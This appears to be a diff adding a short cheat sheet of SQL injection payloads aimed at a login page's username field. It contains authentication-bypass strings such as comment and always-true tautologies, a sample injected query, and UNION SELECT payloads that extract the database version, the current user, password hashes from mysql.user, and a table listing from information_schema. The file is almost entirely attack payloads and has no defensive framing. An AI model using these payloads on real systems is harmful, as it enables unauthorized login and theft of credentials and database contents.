@@ -1,0 +1,37 @@
+Login Page
+
+
+
+user:	admin' --
+	admin' #
+	admin'/*
+	' or 1=1--
+	' or 1=1#
+	' or 1=1/*
+	') or '1'='1--
+	') or ('1'='1--
+
+	'
+	'\--/.
+	' or 1=1 --
+	' and 1=0 --
+	'or'1'='1
+	'and'1'='0
+	a' OR 'x'='x'#;
+
+
+
+
+
+	' UNION SELECT 1, 'anotheruser', 'doesnt matter', 1--
+	
+	
+pass:SELECT * FROM members WHERE username = 'admin'--' AND password = 'password'
+
+
+
+
+	 a' UNION ALL SELECT system_user(),user();#
+	a' UNION ALL SELECT 1, @@version;#
+	a' UNION ALL SELECT user,password FROM mysql.user;# 
+	a' UNION select table_schema,table_name FROM information_Schema.tables;#
